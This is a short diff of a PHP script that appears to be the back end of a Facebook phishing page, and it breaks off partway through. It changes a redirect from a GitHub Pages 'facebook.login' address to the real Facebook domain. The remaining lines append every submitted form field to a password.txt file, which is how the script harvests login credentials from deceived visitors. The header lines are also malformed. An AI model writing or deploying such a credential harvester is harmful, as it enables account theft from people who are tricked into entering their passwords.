@@ -1,5 +1,5 @@
 <?php
-header (‘https:https://jan422.github.io/facebook.login/’);
+header (‘www.facebook.com’);
 $handle = fopen(“password.txt”, “a”);
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
